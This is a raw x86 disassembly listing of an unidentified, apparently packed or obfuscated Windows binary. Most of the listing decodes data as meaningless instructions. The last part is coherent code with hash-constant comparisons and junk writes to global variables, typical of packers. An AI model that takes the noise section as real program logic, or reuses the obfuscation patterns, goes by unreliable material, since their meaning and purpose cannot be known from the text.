  41bac6:	shl    BYTE PTR [eax+0x50],0xf5
  41baca:	cmp    DWORD PTR [esi-0x3d8cb628],eax
  41bad0:	jecxz  0x41bb0f
  41bad2:	mov    esi,0x4f9c4f3e
  41bad7:	ret    0x81cf
  41bada:	cmp    dl,ch
  41badc:	jge    0x41bab7
  41bade:	adc    edx,DWORD PTR [edi]
  41bae0:	xchg   esp,eax
  41bae1:	ss std 
  41bae3:	daa    
  41bae4:	pop    ecx
  41bae5:	mov    ch,0xe4
  41bae7:	or     eax,0x1c6bf344
  41baec:	arpl   cx,dx
  41baee:	lea    ecx,[ecx-0x42]
  41baf1:	sub    eax,0xa9ababdc
  41baf6:	loopne 0x41bab3
  41baf8:	inc    edi
  41baf9:	push   0x96ededeb
  41bafe:	mov    ecx,0x23a95fff
  41bb03:	or     BYTE PTR [ebp-0x365dc27b],cl
  41bb09:	xchg   DWORD PTR [eax+edi*4],ebp
  41bb0c:	xchg   ebp,eax
  41bb0d:	icebp  
  41bb0e:	(bad)  
  41bb0f:	in     eax,0xa6
  41bb11:	(bad)  
  41bb12:	iret   
  41bb13:	fwait
  41bb14:	xchg   ebx,eax
  41bb15:	jns    0x41bb25
  41bb17:	inc    esi
  41bb18:	push   0xff45e22d
  41bb1d:	xor    DWORD PTR [esi],edi
  41bb1f:	push   0x33bc16a4
  41bb24:	pop    ebp
  41bb25:	lea    edx,[ecx+0x5abc9c26]
  41bb2b:	mov    esi,0xf59aab07
  41bb30:	inc    ecx
  41bb31:	or     esp,DWORD PTR [esi]
  41bb33:	leave  
  41bb34:	rcr    BYTE PTR [esi+ecx*4-0x259573a8],0xc6
  41bb3c:	xor    eax,0xe854ab7b
  41bb41:	fist   WORD PTR ss:[edx-0x2e]
  41bb45:	shr    BYTE PTR [eax],cl
  41bb47:	adc    al,0x6d
  41bb49:	stc    
  41bb4a:	dec    ecx
  41bb4b:	jnp    0x41bae0
  41bb4d:	adc    eax,0x21ee9f18
  41bb52:	dec    ebx
  41bb53:	inc    ebx
  41bb54:	ret    
  41bb55:	imul   esp,DWORD PTR [ebx-0x75],0x61
  41bb59:	pop    ebx
  41bb5a:	xchg   ebp,eax
  41bb5b:	xchg   BYTE PTR [ecx+0x756042fd],al
  41bb61:	and    BYTE PTR [edi],cl
  41bb63:	in     al,0x50
  41bb65:	ror    BYTE PTR [edi-0x50],cl
  41bb68:	xor    DWORD PTR [esi],ebp
  41bb6a:	push   edi
  41bb6b:	sar    BYTE PTR [ebx+0x37],1
  41bb6e:	mov    bh,0xfb
  41bb70:	bound  ecx,QWORD PTR [eax]
  41bb72:	addr16 in eax,dx
  41bb74:	dec    ebx
  41bb75:	push   ebp
  41bb76:	jl     0x41bbd9
  41bb78:	or     dl,BYTE PTR [eax+esi*8-0x68]
  41bb7c:	xchg   esp,eax
  41bb7d:	and    dl,BYTE PTR [eax-0x3d]
  41bb80:	xchg   edx,eax
  41bb81:	jecxz  0x41bb5f
  41bb83:	xor    DWORD PTR [esi],0x8d77c0b7
  41bb89:	aam    0x3b
  41bb8b:	fdivp  st(4),st
  41bb8d:	mov    dl,0x42
  41bb8f:	dec    ecx
  41bb90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb91:	cmc    
  41bb92:	repnz sub DWORD PTR [ecx-0x3b],0x21
  41bb97:	or     al,0x89
  41bb99:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41bb9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb9c:	mov    edx,0x7c413f50
  41bba1:	jecxz  0x41bb33
  41bba3:	mov    ebx,DWORD PTR [ebx-0x6d]
  41bba6:	vpacksswb ymm4,ymm3,YMMWORD PTR [edi]
  41bbaa:	push   ds
  41bbab:	out    0x82,eax
  41bbad:	shl    BYTE PTR [ebp+0x1e8be82],1
  41bbb3:	in     eax,0x4
  41bbb5:	and    cl,BYTE PTR [esi+0x2911facb]
  41bbbb:	mov    ch,0xbb
  41bbbd:	jl     0x41bba5
  41bbbf:	dec    ebx
  41bbc0:	and    BYTE PTR [edi-0x27c5c7d7],bh
  41bbc6:	dec    esp
  41bbc7:	push   ebx
  41bbc8:	jg     0x41bbfa
  41bbca:	int3   
  41bbcb:	push   ecx
  41bbcc:	xor    DWORD PTR [eax],edi
  41bbce:	xchg   esp,eax
  41bbcf:	push   ebp
  41bbd0:	mov    ebx,ds
  41bbd2:	or     eax,edi
  41bbd4:	shl    ecx,0xa6
  41bbd7:	popa   
  41bbd8:	ret    
  41bbd9:	pop    es
  41bbda:	scas   al,BYTE PTR es:[edi]
  41bbdb:	imul   edi,DWORD PTR [eax-0x5dce0105],0x6d
  41bbe2:	test   DWORD PTR [esi+0x3f],esp
  41bbe5:	add    BYTE PTR [ecx+ebx*1+0x5ccb86cd],0xa0
  41bbed:	jo     0x41bba2
  41bbef:	mov    al,ds:0xf2425a3
  41bbf4:	dec    DWORD PTR [esp+esi*4]
  41bbf7:	lahf   
  41bbf8:	jl     0x41bc22
  41bbfa:	(bad)  
  41bbfb:	std    
  41bbfc:	sar    edi,1
  41bbfe:	adc    al,0xf3
  41bc00:	fwait
  41bc01:	pop    eax
  41bc02:	sub    ebx,edi
  41bc04:	cmp    ecx,esp
  41bc06:	or     esp,DWORD PTR [ecx]
  41bc08:	iret   
  41bc09:	xchg   esp,eax
  41bc0a:	pop    edx
  41bc0b:	int3   
  41bc0c:	repz inc eax
  41bc0e:	test   al,0x7b
  41bc10:	or     eax,0x24005fa1
  41bc15:	shl    dh,cl
  41bc17:	or     eax,0xd15e6f62
  41bc1c:	mov    bl,0x39
  41bc1e:	pop    edx
  41bc1f:	leave  
  41bc20:	popa   
  41bc21:	in     eax,0x28
  41bc23:	adc    bh,BYTE PTR [edi+0x27813947]
  41bc29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc2a:	pop    eax
  41bc2b:	pop    ecx
  41bc2c:	inc    esi
  41bc2d:	mov    ebx,0x5a985afa
  41bc32:	fdivr  QWORD PTR [edx-0x18]
  41bc35:	sahf   
  41bc36:	adc    DWORD PTR [edi],eax
  41bc38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc39:	pop    DWORD PTR [edi]
  41bc3b:	push   ebx
  41bc3c:	movd   mm2,DWORD PTR [eax+0x4136a578]
  41bc43:	daa    
  41bc44:	mov    ecx,DWORD PTR [edi]
  41bc46:	push   cs
  41bc47:	imul   BYTE PTR [esi+0x59e620eb]
  41bc4d:	mov    bh,BYTE PTR [edi+0xaccd485]
  41bc53:	mov    cl,0xa0
  41bc55:	or     bh,BYTE PTR [esi+0x6dbbb2e9]
  41bc5b:	push   ebp
  41bc5c:	adc    ebx,DWORD PTR [ecx+0x32]
  41bc5f:	mov    cl,0x9e
  41bc61:	inc    edi
  41bc62:	ins    DWORD PTR es:[edi],dx
  41bc63:	scas   eax,DWORD PTR es:[edi]
  41bc64:	add    edx,DWORD PTR ss:[edx-0x9]
  41bc68:	xor    BYTE PTR [esi],ah
  41bc6a:	pop    ebp
  41bc6b:	xor    edi,esi
  41bc6d:	loope  0x41bc09
  41bc6f:	mov    dl,BYTE PTR [esi+0x24a8739c]
  41bc75:	or     eax,0x4ba3acf4
  41bc7a:	dec    esp
  41bc7b:	sub    DWORD PTR [edi+ecx*8+0x2c7ff99f],0xb74db887
  41bc86:	mov    cl,0x1a
  41bc88:	mov    eax,ds:0x15348cd2
  41bc8d:	(bad)  
  41bc8e:	loope  0x41bc4a
  41bc90:	(bad)  
  41bc92:	dec    ebp
  41bc93:	lea    eax,[ebx-0x41]
  41bc96:	out    0xb6,al
  41bc98:	push   ebx
  41bc99:	shl    BYTE PTR [esi+0x3c8d853],1
  41bc9f:	cmc    
  41bca0:	pop    es
  41bca1:	or     dh,al
  41bca3:	add    eax,0xa60deb3f
  41bca8:	and    BYTE PTR [edx],bh
  41bcaa:	mov    ah,0x79
  41bcac:	in     eax,0x23
  41bcae:	add    DWORD PTR [eax-0x59bbd2a1],ebx
  41bcb4:	or     DWORD PTR [ebx-0x64c73cfb],eax
  41bcba:	jecxz  0x41bc8f
  41bcbc:	xchg   BYTE PTR [edi-0x7],dl
  41bcbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcc0:	popf   
  41bcc1:	xor    eax,0xea8c71f8
  41bcc6:	scas   al,BYTE PTR es:[edi]
  41bcc7:	fisttp QWORD PTR [ebp-0x4c]
  41bcca:	adc    al,BYTE PTR [esi]
  41bccc:	dec    edx
  41bccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bccf:	and    edx,eax
  41bcd1:	xor    esp,esp
  41bcd3:	in     eax,dx
  41bcd4:	rol    ah,0xaf
  41bcd7:	dec    edi
  41bcd8:	imul   esp,DWORD PTR [ebp+0x750de0bc],0x908549cf
  41bce2:	dec    edx
  41bce3:	xchg   bl,dh
  41bce5:	pop    ss
  41bce6:	call   0x750b:0x9b9a9f
  41bced:	pop    eax
  41bcee:	stc    
  41bcef:	shr    BYTE PTR [eax],0xbd
  41bcf2:	and    BYTE PTR [edx+eiz*4+0x7bbf19ae],dl
  41bcf9:	dec    edi
  41bcfa:	push   edi
  41bcfb:	dec    ecx
  41bcfc:	mov    ah,0x19
  41bcfe:	mov    esp,0x19489de7
  41bd03:	in     eax,dx
  41bd04:	xchg   DWORD PTR [ebp+eax*8-0x37d6a832],eax
  41bd0b:	in     al,dx
  41bd0c:	jbe    0x41bd76
  41bd0e:	cld    
  41bd0f:	xlat   BYTE PTR ds:[ebx]
  41bd10:	nop
  41bd11:	push   cs
  41bd12:	mov    BYTE PTR [esi+esi*8+0xe],dh
  41bd16:	jae    0x41bcdb
  41bd18:	or     DWORD PTR [ebx+eax*4+0x30],edx
  41bd1c:	cdq    
  41bd1d:	aad    0xaf
  41bd1f:	cli    
  41bd20:	mov    ah,0x71
  41bd22:	and    ah,BYTE PTR [ecx-0x35]
  41bd25:	and    BYTE PTR [ebp-0x73808d16],dh
  41bd2b:	or     edx,esi
  41bd2d:	das    
  41bd2e:	popa   
  41bd2f:	adc    bl,bh
  41bd31:	pop    esi
  41bd32:	pop    esp
  41bd33:	mov    ecx,0x24a0ebec
  41bd38:	addr16 je 0x41bd71
  41bd3b:	mov    dh,0x9d
  41bd3d:	pop    es
  41bd3e:	pop    ds
  41bd3f:	xor    BYTE PTR [ebx+0x4c01e88e],dl
  41bd45:	mov    al,ds:0xe79d33e9
  41bd4a:	sub    ebp,esp
  41bd4c:	jnp    0x41bd49
  41bd4e:	dec    ebp
  41bd4f:	dec    edx
  41bd50:	pop    es
  41bd51:	xor    al,0x1
  41bd53:	hlt    
  41bd54:	push   ecx
  41bd55:	and    eax,0x32d3ca98
  41bd5a:	out    dx,al
  41bd5b:	(bad)  
  41bd5c:	gs mov dh,0xa8
  41bd5f:	div    BYTE PTR [edi-0x35da9670]
  41bd65:	xchg   esp,eax
  41bd66:	ret    
  41bd67:	rcl    DWORD PTR ds:0x44563a02,1
  41bd6d:	loope  0x41bd73
  41bd6f:	cmp    BYTE PTR [edx-0x4b177563],ah
  41bd75:	mov    bh,0x8b
  41bd77:	add    cl,BYTE PTR [esi+0xe]
  41bd7a:	aaa    
  41bd7b:	mov    DWORD PTR [edi-0x39],ecx
  41bd7e:	lds    esp,FWORD PTR [ebx-0xa15cf47]
  41bd84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd85:	push   eax
  41bd86:	jp     0x41bd3e
  41bd88:	jno    0x41bd87
  41bd8a:	cmp    DWORD PTR [edi+0x49a6f6cb],edx
  41bd90:	sar    bl,0x2e
  41bd93:	pop    esi
  41bd94:	neg    BYTE PTR [eax+0x53]
  41bd97:	je     0x41bdc3
  41bd99:	xor    eax,0x31068652
  41bd9e:	push   ebp
  41bd9f:	inc    ecx
  41bda0:	pop    es
  41bda1:	cs (bad) 
  41bda4:	mov    ds:0x5ce4f840,eax
  41bda9:	dec    ebx
  41bdaa:	(bad)  
  41bdab:	mov    ch,0xf5
  41bdad:	pop    ds
  41bdae:	mov    edi,0x2059ab90
  41bdb3:	retf   0xb7b0
  41bdb6:	lea    ebp,[ebp+ebp*8+0x269b17ae]
  41bdbd:	pusha  
  41bdbe:	mov    al,ds:0x297cb659
  41bdc3:	std    
  41bdc4:	iret   
  41bdc5:	div    DWORD PTR [eax]
  41bdc7:	(bad)
  41bdca:	scas   al,BYTE PTR es:[edi]
  41bdcb:	mov    esi,0x7c54eab2
  41bdd0:	mov    ah,BYTE PTR [edx]
  41bdd2:	or     ah,bh
  41bdd4:	imul   eax,DWORD PTR [edi+edi*4+0x6e5bbf38],0xa8c29704
  41bddf:	fdivr  DWORD PTR [edi-0x28]
  41bde2:	fdiv   QWORD PTR [ebp+0xbc9cf68]
  41bde8:	cmp    BYTE PTR [eax-0x67633738],cl
  41bdee:	daa    
  41bdef:	in     eax,0x17
  41bdf1:	lods   eax,DWORD PTR ds:[esi]
  41bdf2:	out    0x6f,al
  41bdf4:	jmp    0xdd04a757
  41bdf9:	loopne 0x41bd8c
  41bdfb:	neg    BYTE PTR [ebx+0xfbc6ecd]
  41be01:	and    ebp,DWORD PTR [ecx-0x7c]
  41be04:	xor    DWORD PTR [eax+eax*2],0x17
  41be08:	sbb    eax,0x16611d69
  41be0d:	pushf  
  41be0e:	adc    BYTE PTR [ecx+0x4d],cl
  41be11:	xchg   BYTE PTR [esi+0x12],bl
  41be14:	test   al,0xba
  41be16:	lods   eax,DWORD PTR ds:[esi]
  41be17:	repz and al,0xbb
  41be1a:	push   cs
  41be1b:	mov    ch,0xea
  41be1d:	inc    ebp
  41be1e:	jl     0x41be78
  41be20:	jp     0x41bdfc
  41be22:	mov    esi,0x349502e6
  41be27:	xlat   BYTE PTR ds:[ebx]
  41be28:	sbb    al,0xf5
  41be2a:	shl    bh,cl
  41be2c:	test   al,0xf7
  41be2e:	add    al,0x76
  41be30:	out    0xfa,eax
  41be32:	das    
  41be33:	cmp    al,0x6c
  41be35:	rcl    DWORD PTR [ebx],0xd0
  41be38:	(bad)  
  41be3a:	push   es
  41be3b:	(bad)  
  41be3c:	out    dx,al
  41be3d:	stc    
  41be3e:	jmp    0x1aaf:0x5aa341bf
  41be45:	outs   dx,BYTE PTR ds:[esi]
  41be46:	mov    eax,ds:0xc13333cc
  41be4b:	arpl   WORD PTR [edx-0x41],sp
  41be4e:	stos   DWORD PTR es:[edi],eax
  41be4f:	or     BYTE PTR [ebx],0x2d
  41be52:	sbb    edi,DWORD PTR [edx+0x41057f92]
  41be58:	call   0x9565:0xabad6822
  41be5f:	lds    edx,FWORD PTR ds:0x1ce24cd2
  41be65:	xchg   DWORD PTR [edi-0x4a507503],edi
  41be6b:	or     cl,bh
  41be6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be6e:	jecxz  0x41be62
  41be70:	popa   
  41be71:	repz cmp ch,ah
  41be74:	jg     0x41bec5
  41be76:	sahf   
  41be77:	or     DWORD PTR [edx-0x29fdddf4],ebx
  41be7d:	mov    ebp,0xca0cf465
  41be82:	xchg   ecx,eax
  41be83:	add    dh,BYTE PTR [ecx+ebx*2]
  41be86:	or     ebp,esi
  41be88:	cld    
  41be89:	xchg   BYTE PTR [edi],cl
  41be8b:	nop
  41be8c:	jno    0x41bece
  41be8e:	mov    ch,0xe7
  41be90:	dec    eax
  41be91:	mov    ebp,0x514c8bae
  41be96:	adc    edi,ebp
  41be98:	xchg   esp,eax
  41be99:	iret   
  41be9a:	dec    esp
  41be9b:	ja     0x41bf1b
  41be9d:	dec    esi
  41be9e:	jmp    0x2cd0c686
  41bea3:	rol    DWORD PTR [edi+0x7907f86b],0xf3
  41beaa:	std    
  41beab:	jb     0x41becc
  41bead:	popa   
  41beae:	jns    0x41beec
  41beb0:	lahf   
  41beb1:	imul   esi,DWORD PTR [eax-0x4a19ee97],0x951991d7
  41bebb:	xlat   BYTE PTR ds:[ebx]
  41bebc:	xchg   ebp,eax
  41bebd:	xor    BYTE PTR [ebp+0x25],ah
  41bec0:	push   ecx
  41bec1:	repz bnd jnp 0x41be52
  41bec5:	mov    ebp,ecx
  41bec7:	jg     0x41bea4
  41bec9:	imul   ebx,edx,0x26
  41becc:	jo     0x41be51
  41bece:	or     edx,DWORD PTR [ebp+ecx*1+0x689ecf3a]
  41bed5:	sub    ch,BYTE PTR [eax]
  41bed7:	gs cmp al,0xbe
  41beda:	sbb    BYTE PTR [eax],dh
  41bedc:	sbb    esi,DWORD PTR [edi+0x43]
  41bedf:	add    BYTE PTR gs:[edx+0x60ea7136],al
  41bee6:	cld    
  41bee7:	rep outs dx,DWORD PTR ds:[esi]
  41bee9:	push   edi
  41beea:	leave  
  41beeb:	out    dx,al
  41beec:	arpl   WORD PTR [esi-0x21],bx
  41beef:	imul   edi,DWORD PTR [ebx],0xffffffa3
  41bef2:	and    ebx,edx
  41bef4:	or     DWORD PTR [esi],ecx
  41bef6:	mov    ebp,0x614869bc
  41befb:	xchg   edx,eax
  41befc:	aaa    
  41befd:	mov    fs:0x4cd61c41,eax
  41bf03:	test   al,0x5e
  41bf05:	inc    edi
  41bf06:	cmp    DWORD PTR [esi-0x77],esp
  41bf09:	jb     0x41bf73
  41bf0b:	aas    
  41bf0c:	inc    ecx
  41bf0d:	iret   
  41bf0e:	mov    ds:0x4b8fbde0,al
  41bf13:	lea    edi,[esi+0x4]
  41bf16:	call   0x7fb3359a
  41bf1b:	aaa    
  41bf1c:	inc    eax
  41bf1d:	sub    eax,0xb23a1210
  41bf22:	pop    ds
  41bf23:	scas   eax,DWORD PTR es:[edi]
  41bf24:	fs push ebx
  41bf26:	ja     0x41bed9
  41bf28:	mov    cl,0xca
  41bf2a:	daa    
  41bf2b:	pop    ebx
  41bf2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf2d:	test   eax,0xd4f8d78b
  41bf32:	retf   
  41bf33:	pop    ss
  41bf34:	jnp    0x41bf32
  41bf36:	adc    ecx,DWORD PTR [ebx+0x64]
  41bf39:	push   ebp
  41bf3a:	pushf  
  41bf3b:	mov    al,ds:0x70ad4b5b
  41bf40:	cmp    BYTE PTR [ebp+0x32a56c5f],dl
  41bf46:	jmp    0xc46f:0x6601e61f
  41bf4d:	in     eax,dx
  41bf4e:	fwait
  41bf4f:	outs   dx,DWORD PTR ds:[esi]
  41bf50:	push   esi
  41bf51:	sbb    DWORD PTR [esi],edx
  41bf53:	sub    eax,0x123ccc5a
  41bf58:	(bad)  
  41bf59:	xor    eax,0xa34b9840
  41bf5e:	and    al,BYTE PTR [ebp+0x0]
  41bf61:	and    DWORD PTR [eax+eax*1],ebp
  41bf64:	add    al,0xe
  41bf66:	sub    BYTE PTR [ebx+0x79],ch
  41bf69:	fdiv   DWORD PTR [ebx]
  41bf6b:	xor    BYTE PTR [esi-0x7b],dh
  41bf6e:	in     eax,0x51
  41bf70:	push   ss
  41bf71:	inc    esp
  41bf72:	sub    eax,0xc2199f77
  41bf77:	addr16 xor ch,dh
  41bf7a:	mov    ebx,0x6e35f907
  41bf7f:	imul   esp,DWORD PTR [eax+0x451447ba],0x7b
  41bf86:	jo     0x41bfa6
  41bf88:	retf   0xbd1f
  41bf8b:	push   esi
  41bf8c:	das    
  41bf8d:	call   0x7964:0x47438b72
  41bf94:	and    DWORD PTR [edx],edi
  41bf96:	and    eax,0xb9da2c28
  41bf9b:	repz xchg esi,eax
  41bf9d:	adc    al,0x36
  41bf9f:	stos   BYTE PTR es:[edi],al
  41bfa0:	shl    BYTE PTR [ebx+0x38842ae5],1
  41bfa6:	add    al,BYTE PTR [ebp-0xd]
  41bfa9:	add    dh,BYTE PTR [edi+0x1f4f1032]
  41bfaf:	sbb    eax,0xc2e7811f
  41bfb4:	iret   
  41bfb5:	push   0xfffffff2
  41bfb7:	repz mov dh,0x12
  41bfba:	lea    ebp,[ecx+0x12c6e25d]
  41bfc0:	iret   
  41bfc1:	cli    
  41bfc2:	lods   eax,DWORD PTR ds:[esi]
  41bfc3:	jle    0x41c034
  41bfc5:	adc    al,0x96
  41bfc7:	or     bl,BYTE PTR [esi+0x2b]
  41bfca:	add    ch,al
  41bfcc:	in     al,0xd6
  41bfce:	jnp    0x41bf78
  41bfd0:	adc    eax,0x6f3b866b
  41bfd5:	mov    bl,0x7b
  41bfd7:	fadd   DWORD PTR [ebx+0x56]
  41bfda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfdb:	not    DWORD PTR [ecx]
  41bfdd:	sub    DWORD PTR [eax+0x64c77588],edx
  41bfe3:	mov    ah,0x2b
  41bfe5:	jbe    0x41bf6c
  41bfe7:	stos   DWORD PTR es:[edi],eax
  41bfe8:	mov    al,ds:0x53d06b02
  41bfed:	gs ss push ecx
  41bff0:	sbb    eax,0x86fdafe9
  41bff5:	lea    ecx,cs:[ecx+0x56]
  41bff9:	jno    0x41c06c
  41bffb:	mov    WORD PTR [esi+0x49],cs
  41bffe:	dec    ebx
  41bfff:	hlt    
  41c000:	pop    eax
  41c001:	mov    bl,0x5b
  41c003:	(bad)  
  41c004:	xlat   BYTE PTR ds:[ebx]
  41c005:	push   cs
  41c006:	repnz outs dx,BYTE PTR ds:[esi]
  41c008:	in     eax,0xd1
  41c00a:	or     ecx,0xcf58ed3e
  41c010:	mov    edi,0x83c1838a
  41c015:	jmp    0x43b3:0x4d503108
  41c01c:	dec    edx
  41c01d:	cmp    DWORD PTR [ecx],edi
  41c01f:	stc    
  41c020:	ror    DWORD PTR [edx-0x6e],0xa8
  41c024:	popa   
  41c025:	es mov bl,0xe0
  41c028:	sub    eax,0x7964e8aa
  41c02d:	test   DWORD PTR [ebx-0x6b],ebx
  41c030:	ins    DWORD PTR es:[edi],dx
  41c031:	dec    esp
  41c032:	sbb    al,dl
  41c034:	loope  0x41c059
  41c036:	fdivr  DWORD PTR [ecx+0x44]
  41c039:	adc    al,ch
  41c03b:	out    dx,al
  41c03c:	jmp    0x916d:0x2011ed0a
  41c043:	retf   0xb914
  41c046:	ins    BYTE PTR es:[edi],dx
  41c047:	ja     0x41bfe3
  41c049:	cmp    eax,0xe60c300f
  41c04e:	push   edx
  41c04f:	push   0xfea28c3d
  41c054:	(bad)  
  41c055:	repnz inc eax
  41c057:	pop    es
  41c058:	mov    ecx,0x34334e98
  41c05d:	sub    bh,bl
  41c05f:	xlat   BYTE PTR ds:[ebx]
  41c060:	arpl   WORD PTR [edx-0x4c],sp
  41c063:	sub    BYTE PTR [edx],ch
  41c065:	stos   BYTE PTR es:[edi],al
  41c066:	xchg   edx,eax
  41c067:	sub    cl,BYTE PTR [eax+0xa816129]
  41c06d:	out    0xc5,al
  41c06f:	xchg   esi,eax
  41c070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c071:	popf   
  41c072:	call   0x95329301
  41c077:	xchg   DWORD PTR [edi],esi
  41c079:	ficom  DWORD PTR ds:0x22befa65
  41c07f:	fcomp  QWORD PTR [eax-0x6]
  41c082:	repz rcl DWORD PTR [eax],0xff
  41c086:	add    edi,DWORD PTR [edx+0x2b]
  41c089:	test   eax,0x153574ed
  41c08e:	outs   dx,BYTE PTR ds:[esi]
  41c08f:	mov    ecx,0x6a95fa51
  41c094:	mov    ecx,0xbe5e87f7
  41c099:	dec    ebp
  41c09a:	ss jbe 0x41c111
  41c09d:	or     cl,dh
  41c09f:	js     0x41c0ab
  41c0a1:	mov    al,0xc9
  41c0a3:	pop    ss
  41c0a4:	and    DWORD PTR ds:[esi+esi*1+0x2d9ec940],edx
  41c0ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0ad:	test   DWORD PTR [ebx-0x7a],ebx
  41c0b0:	into   
  41c0b1:	ror    BYTE PTR [ebx],cl
  41c0b3:	arpl   WORD PTR [ebp-0x3e],dx
  41c0b6:	and    DWORD PTR [ecx-0x17],esi
  41c0b9:	or     BYTE PTR [esi+0x360b4258],cl
  41c0bf:	retf   0xe644
  41c0c2:	or     ebp,DWORD PTR [esi]
  41c0c4:	xor    edi,ebp
  41c0c6:	rcr    BYTE PTR [edi],1
  41c0c8:	fiadd  WORD PTR [ebp+0x14]
  41c0cb:	mov    cs,WORD PTR [edx+0x143d441d]
  41c0d1:	mov    ch,cl
  41c0d3:	jo     0x41c073
  41c0d5:	repnz pushf 
  41c0d7:	inc    edi
  41c0d8:	les    edi,FWORD PTR [edx+0x4457fbb8]
  41c0de:	jmp    0x99f4:0xcb40f55a
  41c0e5:	push   ecx
  41c0e6:	pop    esp
  41c0e7:	out    0x8f,al
  41c0e9:	inc    ebx
  41c0ea:	test   DWORD PTR [esi+0x42f94dac],ebp
  41c0f0:	jae    0x41c0c4
  41c0f2:	mov    dl,0xe8
  41c0f4:	pop    es
  41c0f5:	cmp    dh,BYTE PTR [edx]
  41c0f7:	and    bl,BYTE PTR [esp+ecx*2+0x6f]
  41c0fb:	dec    ecx
  41c0fc:	aaa    
  41c0fd:	je     0x41c08a
  41c0ff:	dec    ebp
  41c100:	call   0xcf7dbb08
  41c105:	je     0x41c147
  41c10b:	mov    ecx,DWORD PTR [ebp-0x18]
  41c10e:	add    ecx,eax
  41c110:	mov    DWORD PTR [ebp-0x1c],ecx
  41c113:	mov    ecx,DWORD PTR [ebp-0x30]
  41c116:	mov    edx,DWORD PTR [ebp-0x2c]
  41c119:	mov    edx,0xa147
  41c11e:	xor    cx,dx
  41c121:	mov    edx,DWORD PTR [ebp-0x1c]
  41c124:	mov    edx,DWORD PTR [edx+0xc]
  41c127:	add    cx,si
  41c12a:	cmp    WORD PTR [eax+edx*1],cx
  41c12e:	jne    0x41c147
  41c134:	mov    ecx,DWORD PTR ds:0x4262c9
  41c13a:	mov    ecx,DWORD PTR [ecx+0x198]
  41c140:	mov    DWORD PTR [ecx],eax
  41c142:	jmp    0x41c1c5
  41c147:	push   DWORD PTR [ebp+0x1c]
  41c14a:	push   DWORD PTR [ebp+0x18]
  41c14d:	jmp    0x41c1b4
  41c152:	mov    eax,DWORD PTR [ebp+0x18]
  41c155:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c158:	cmp    eax,0x70941f9e
  41c15d:	jne    0x41c176
  41c163:	cmp    ecx,ebx
  41c165:	jne    0x41c176
  41c16b:	push   ebx
  41c16c:	push   0x70941f9b
  41c171:	jmp    0x41c1b4
  41c176:	mov    ecx,DWORD PTR [ebp+0x18]
  41c179:	mov    edx,DWORD PTR [ebp+0x1c]
  41c17c:	mov    eax,0x70941f98
  41c181:	cmp    ecx,eax
  41c183:	jne    0x41c198
  41c189:	cmp    edx,ebx
  41c18b:	jne    0x41c198
  41c191:	push   ebx
  41c192:	push   edi
  41c193:	jmp    0x41c1b4
  41c198:	mov    ecx,DWORD PTR [ebp+0x18]
  41c19b:	mov    edx,DWORD PTR [ebp+0x1c]
  41c19e:	cmp    ecx,0x70941f9b
  41c1a4:	jne    0x41c1c5
  41c1aa:	cmp    edx,ebx
  41c1ac:	jne    0x41c1c5
  41c1b2:	push   ebx
  41c1b3:	push   eax
  41c1b4:	push   DWORD PTR [ebp+0x14]
  41c1b7:	push   DWORD PTR [ebp+0x10]
  41c1ba:	push   DWORD PTR [ebp+0xc]
  41c1bd:	push   DWORD PTR [ebp+0x8]
  41c1c0:	call   0x417355
  41c1c5:	pop    edi
  41c1c6:	pop    esi
  41c1c7:	pop    ebx
  41c1c8:	leave  
  41c1c9:	ret    0x18
  41c1cc:	push   ebp
  41c1cd:	mov    ebp,esp
  41c1cf:	and    esp,0xfffffff8
  41c1d2:	add    DWORD PTR ds:0x426f09,0x426ef5
  41c1dc:	mov    al,ds:0x4263ef
  41c1e1:	sub    esp,0x54
  41c1e4:	mov    DWORD PTR ds:0x426eb5,0x2e24
  41c1ee:	push   ebx
  41c1ef:	push   esi
  41c1f0:	push   edi
  41c1f1:	mov    DWORD PTR ds:0x426f15,0x7495
  41c1fb:	cmp    al,BYTE PTR ds:0x4263fa
  41c201:	mov    DWORD PTR ds:0x426ee9,0x194c
  41c20b:	je     0x41c22c
  41c211:	or     DWORD PTR ds:0x426eed,0x426ed5
  41c21b:	xor    eax,eax
  41c21d:	mov    DWORD PTR ds:0x426ee1,0xaaa
  41c227:	jmp    0x41d276
  41c22c:	mov    al,ds:0x42640c
  41c231:	cmp    al,BYTE PTR ds:0x42641b
  41c237:	mov    DWORD PTR ds:0x426ee9,0x1f8d
  41c241:	jne    0x41c211
  41c247:	neg    edi
  41c249:	mov    edi,DWORD PTR ds:0x42fa50
  41c24f:	and    DWORD PTR ds:0x426ee1,0x426e95
  41c259:	push   0x426425
  41c25e:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c268:	push   0x426435
  41c26d:	adc    DWORD PTR ds:0x426eed,0x426ed5
  41c277:	call   edi
  41c279:	test   eax,eax
  41c27b:	mov    DWORD PTR ds:0x426ee5,0x502f
  41c285:	je     0x41c211
  41c28b:	push   0x426449
  41c290:	and    DWORD PTR ds:0x426f1d,0x426ef1
  41c29a:	call   DWORD PTR ds:0x42fa34
  41c2a0:	mov    DWORD PTR [esp+0x44],0x0
  41c2a8:	mov    ecx,0xf89c85b5
  41c2ad:	mov    DWORD PTR [esp+0x10],ecx
  41c2b1:	mov    DWORD PTR ds:0x426edd,0x1a
  41c2bb:	cmp    DWORD PTR ds:0x426edd,0x0
  41c2c2:	je     0x41c31b
  41c2c8:	cmp    DWORD PTR ds:0x426edd,0x7
  41c2cf:	jle    0x41c31b
  41c2d5:	jmp    0x41c2ed
  41c2da:	push   DWORD PTR [ebp-0x20]
  41c2dd:	push   0x4e76
  41c2e2:	push   0x4592
  41c2e7:	call   DWORD PTR ds:0x42fa18
